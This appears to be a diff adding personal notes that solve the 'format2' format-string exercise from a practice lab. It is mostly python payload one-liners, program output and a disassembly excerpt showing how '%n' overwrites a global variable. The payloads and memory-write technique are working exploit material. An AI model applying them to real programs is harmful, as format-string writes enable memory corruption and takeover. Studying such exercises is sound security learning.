@@ -1,0 +1,44 @@
+1. Match 4 bytes of user input with last format specifier '%n'.
+
+python -c 'print "A" * 4 + "B" * 4 + "%x " * 4 + "%x "' | ./format2
+AAAABBBB200 b7fd8420 bffff614 41414141 42424242 
+target is 0 :(
+
+2. Locate memory of 'target':
+
+objdump -t ./format2 | grep target
+080496e4 g     O .bss	00000004              target
+
+3. Inject Shellcode, point last format specifier to '&target'.
+
+python -c 'print "A" * 4 + "\xe4\x96\x04\x08" + "%x " * 4 + "%n "' | ./format2
+AAAA��200 b7fd8420 bffff614 41414141  
+target is 39 :(
+
+5. Match the if condition (64).
+
+39? How do we have 39 already? Can I increment/decrement? Let's add padding.
+
+python -c 'print "A" * 4 + "\xe4\x96\x04\x08" + "C" * 25 + "%x " * 4 + "%n "' | ./format2
+
+The 'C*1' adds padding +1 onto EAX register at 'cmp eax, 0x40'.
+
+
+===============================================================================
+   0x565555e4 <+71>:	lea    eax,[ebx+0x28]
+   0x565555ea <+77>:	mov    eax,DWORD PTR [eax]
+=> 0x565555ec <+79>:	cmp    eax,0x40		; if (target == 64) {
+   0x565555ef <+82>:	jne    0x56555605 <vuln+104>
+   0x565555f1 <+84>:	sub    esp,0xc
+   0x565555f4 <+87>:	lea    eax,[ebx-0x1920]
+   0x565555fa <+93>:	push   eax
+   0x565555fb <+94>:	call   0x56555430 <puts@plt>	; modified target :)
+-------------------------------------------------------------------------------
+
+ if(target == 64) {
+      printf("you have modified the target :)\n");
+  } else {
+      printf("target is %d :(\n", target);
+
+===============================================================================
+
